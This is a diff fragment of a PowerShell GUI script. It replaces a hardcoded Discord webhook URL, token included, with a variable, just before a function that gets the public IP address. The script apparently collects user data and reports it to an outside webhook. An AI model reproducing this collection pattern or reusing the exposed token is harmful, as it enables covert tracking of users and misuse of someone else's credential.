@@ -29,7 +29,7 @@ $button.Size = New-Object System.Drawing.Size(100, 30)
 $form.Controls.Add($button)
 
 # Define Discord webhook URL
-$discordWebhook = "https://discord.com/api/webhooks/1316546390930886686/DhHnYNvnpHesgUlz7-FsGT-ZcbSu9oK00i3DtBHz-rV7MY5jtgL6RywX_FMJisdXtm9P"  # Replace with your webhook URL
+$discordWebhook = "$dc"  # Replace with your webhook URL
 
 # Get public IP address
 function Get-PublicIP {
